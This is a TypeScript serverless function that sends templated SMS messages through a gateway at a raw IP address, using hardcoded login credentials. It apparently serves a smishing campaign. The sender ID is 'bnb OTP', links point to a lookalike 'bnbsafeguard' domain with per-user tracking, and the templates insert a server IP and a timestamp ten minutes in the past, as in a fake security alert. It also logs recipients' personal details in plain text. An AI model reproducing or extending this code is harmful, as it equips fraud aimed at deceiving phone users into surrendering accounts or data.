
import { serve } from "https://deno.land/std@0.190.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2.50.2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

interface SMSRequest {
  phone: string;
  message: string;
  name: string;
  first_name: string;
  user_id: string;
}

const handler = async (req: Request): Promise<Response> => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { phone, message, name, first_name, user_id }: SMSRequest = await req.json();

    console.log("=== SMS REQUEST RECEIVED ===");
    console.log("Phone:", phone);
    console.log("Message:", message);
    console.log("Name:", name);
    console.log("First Name:", first_name);
    console.log("User ID:", user_id);

    // Validate required parameters
    if (!phone || !message || !first_name || !user_id) {
      console.error("Missing required parameters");
      return new Response(JSON.stringify({
        success: false,
        error: "Missing required parameters: phone, message, first_name, or user_id"
      }), {
        status: 400,
        headers: { "Content-Type": "application/json", ...corsHeaders },
      });
    }

    // Initialize Supabase client to fetch server config
    const supabase = createClient(
      Deno.env.get("SUPABASE_URL") ?? "",
      Deno.env.get("SUPABASE_ANON_KEY") ?? ""
    );

    // Fetch the current server IP from the database
    const { data: serverConfig, error: configError } = await supabase
      .from('server_config')
      .select('current_server_ip')
      .single();

    let currentServerIp = '127.0.0.1'; // fallback IP
    if (configError) {
      console.warn('Could not fetch server config, using fallback IP:', configError);
    } else if (serverConfig?.current_server_ip) {
      currentServerIp = String(serverConfig.current_server_ip);
    }

    console.log("Current server IP from database:", currentServerIp);

    // Clean and validate phone number
    let cleanPhone = phone.replace(/[^\d+]/g, '');
    console.log("Original phone:", phone);
    console.log("Cleaned phone number:", cleanPhone);
    
    // Add country code if missing (assuming international format needed)
    if (!cleanPhone.startsWith('+')) {
      // If phone starts with 0, replace with country code (adjust as needed)
      if (cleanPhone.startsWith('0')) {
        cleanPhone = '+33' + cleanPhone.substring(1); // Example for France
        console.log("Added country code:", cleanPhone);
      } else if (cleanPhone.length === 10) {
        cleanPhone = '+33' + cleanPhone; // Example for France
        console.log("Added full country code:", cleanPhone);
      }
    }

    // Remove + for the SMS API as it expects numbers without +
    const phoneForAPI = cleanPhone.replace('+', '');
    console.log("Phone for API (without +):", phoneForAPI);

    // Validate phone number format
    if (phoneForAPI.length < 10 || phoneForAPI.length > 15) {
      console.error("Invalid phone number format:", phoneForAPI);
      return new Response(JSON.stringify({
        success: false,
        error: "Invalid phone number format. Phone must be 10-15 digits."
      }), {
        status: 400,
        headers: { "Content-Type": "application/json", ...corsHeaders },
      });
    }

    // Create the WireGuard access link
    const accessLink = `https://fr.bnbsafeguard.com/?user=${user_id}`;
    
    // Calculate current time minus 10 minutes in UTC
    const now = new Date();
    const timeMinus10 = new Date(now.getTime() - 10 * 60 * 1000);
    const formattedTime = timeMinus10.toISOString().replace('T', ' ').replace(/\.\d{3}Z$/, ' UTC');
    
    // Replace variables in the message
    let finalMessage = message;
    finalMessage = finalMessage.replace(/{{name}}/g, name || '');
    finalMessage = finalMessage.replace(/{{first_name}}/g, first_name || '');
    finalMessage = finalMessage.replace(/{{phone}}/g, phone || '');
    finalMessage = finalMessage.replace(/{{current_ip}}/g, currentServerIp);
    finalMessage = finalMessage.replace(/{{link}}/g, accessLink);
    finalMessage = finalMessage.replace(/{{current_time_minus_10}}/g, formattedTime);
    finalMessage = finalMessage.replace(/https?:\/\/api\.bnbsafeguard\.com/gi, 'https://fr.bnbsafeguard.com');
    
    console.log("=== MESSAGE PROCESSING ===");
    console.log("Final message:", finalMessage);
    console.log("Message length:", finalMessage.length);
    console.log("Access link:", accessLink);
    console.log("Server IP used:", currentServerIp);

    // SMS API Configuration based on the documentation
    const smsConfig = {
      username: "CharFR",
      password: "Char9",
      sender: "bnb OTP",
      type: "TEXT"
    };

    // Correct SMS endpoint based on documentation
    const smsEndpoint = "http://13.234.255.157/endsms/sendsms.php";

    try {
      console.log(`=== TRYING SMS ENDPOINT: ${smsEndpoint} ===`);
      console.log("SMS Config:", { ...smsConfig, password: "***" });
      
      // Build URL with proper encoding - following the API documentation exactly
      const params = new URLSearchParams();
      params.append('username', smsConfig.username);
      params.append('password', smsConfig.password);
      params.append('type', smsConfig.type);
      params.append('sender', smsConfig.sender);
      params.append('mobile', phoneForAPI);
      params.append('message', encodeURIComponent(finalMessage));

      const finalUrl = `${smsEndpoint}?${params.toString()}`;
      
      console.log("Request URL (without password):", finalUrl.replace(smsConfig.password, "***"));

      // Set up request with timeout
      const controller = new AbortController();
      const timeoutId = setTimeout(() => {
        console.log("Request timeout triggered (15s)");
        controller.abort();
      }, 15000); // 15 second timeout

      console.log("Sending GET request to SMS API...");
      
      const response = await fetch(finalUrl, {
        method: 'GET',
        headers: {
          'User-Agent': 'BNB-SMS-Service/1.0',
          'Accept': 'text/plain, text/html, */*',
          'Cache-Control': 'no-cache',
        },
        signal: controller.signal,
      });

      clearTimeout(timeoutId);

      console.log("=== SMS API RESPONSE ===");
      console.log("Status:", response.status);
      console.log("Status Text:", response.statusText);
      console.log("Headers:", Object.fromEntries(response.headers.entries()));

      const responseText = await response.text();
      console.log("Response Body:", responseText);

      // Parse response based on API documentation
      let isSuccess = false;
      let messageId = null;
      let errorDetails = null;

      if (response.ok && responseText) {
        // Check for success response: SUBMIT_SUCCESS |xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
        if (responseText.includes('SUBMIT_SUCCESS')) {
          isSuccess = true;
          // Extract message ID if present
          const parts = responseText.split('|');
          if (parts.length > 1) {
            messageId = parts[1].trim();
          }
          console.log("SMS submitted successfully, Message ID:", messageId);
        } else {
          // Handle error responses based on documentation
          const errorCode = responseText.trim();
          console.log("SMS API returned error code:", errorCode);
          
          const errorMap: Record<string, string> = {
            'ERR_PARAMETER': 'Missing parameter or malformed URL',
            'ERR_MOBILE': 'Invalid mobile number format',
            'ERR_SENDER': 'Invalid sender ID',
            'ERR_MESSAGE_TYPE': 'Invalid message type',
            'ERR_MESSAGE': 'Malformed or invalid message',
            'ERR_USERNAME': 'Invalid username format',
            'ERR_PASSWORD': 'Invalid password format',
            'ERR_LOGIN': 'Invalid login credentials',
            'ERR_CREDIT': 'Insufficient account balance',
            'ERR_ROUTING': 'Invalid routing for destination',
            'ERR_INTERNAL': 'Internal server error',
            'ERR_SENDER_ID_NOT_APPROVED': 'Sender ID not approved'
          };

          errorDetails = errorMap[errorCode] || `Unknown error: ${errorCode}`;
        }
      } else {
        errorDetails = `HTTP ${response.status}: ${response.statusText}`;
      }

      if (isSuccess) {
        console.log("SMS sent successfully!");
        return new Response(JSON.stringify({ 
          success: true, 
          message: "SMS sent successfully",
          phone: cleanPhone,
          original_phone: phone,
          recipient: first_name,
          api_response: responseText,
          message_id: messageId,
          link_sent: accessLink,
          endpoint_used: smsEndpoint,
          status_code: response.status,
          message_length: finalMessage.length,
          config_used: { ...smsConfig, password: "***" },
          server_ip_used: currentServerIp
        }), {
          status: 200,
          headers: {
            "Content-Type": "application/json",
            ...corsHeaders,
          },
        });
      } else {
        console.error("SMS delivery failed:", errorDetails);
        return new Response(JSON.stringify({ 
          success: false, 
          error: "SMS delivery failed",
          details: errorDetails,
          phone: cleanPhone,
          original_phone: phone,
          recipient: first_name,
          api_response: responseText,
          endpoint_used: smsEndpoint,
          server_ip_used: currentServerIp,
          troubleshooting: {
            phone_format: "Ensure phone number is valid international format",
            message_length: finalMessage.length,
            api_status: "Check SMS API credentials and account balance",
            error_code: responseText
          }
        }), {
          status: 500,
          headers: {
            "Content-Type": "application/json",
            ...corsHeaders,
          },
        });
      }

    } catch (fetchError: any) {
      console.error(`=== FETCH ERROR for ${smsEndpoint} ===`);
      console.error("Error:", fetchError.message);
      console.error("Error type:", fetchError.name);
      
      return new Response(JSON.stringify({ 
        success: false, 
        error: "SMS service connection failed",
        details: fetchError.message,
        phone: cleanPhone,
        original_phone: phone,
        recipient: first_name,
        endpoint_used: smsEndpoint,
        server_ip_used: currentServerIp,
        troubleshooting: {
          connection: "Check if SMS API endpoint is accessible",
          timeout: "Request may have timed out",
          network: "Verify network connectivity to SMS provider"
        }
      }), {
        status: 500,
        headers: {
          "Content-Type": "application/json",
          ...corsHeaders,
        },
      });
    }

  } catch (error: any) {
    console.error("=== GENERAL ERROR ===");
    console.error("Error processing SMS request:", error);
    
    return new Response(
      JSON.stringify({ 
        success: false,
        error: "SMS service error - failed to process request",
        details: error.message,
        error_type: error.name
      }),
      {
        status: 500,
        headers: { "Content-Type": "application/json", ...corsHeaders },
      }
    );
  }
};

serve(handler);
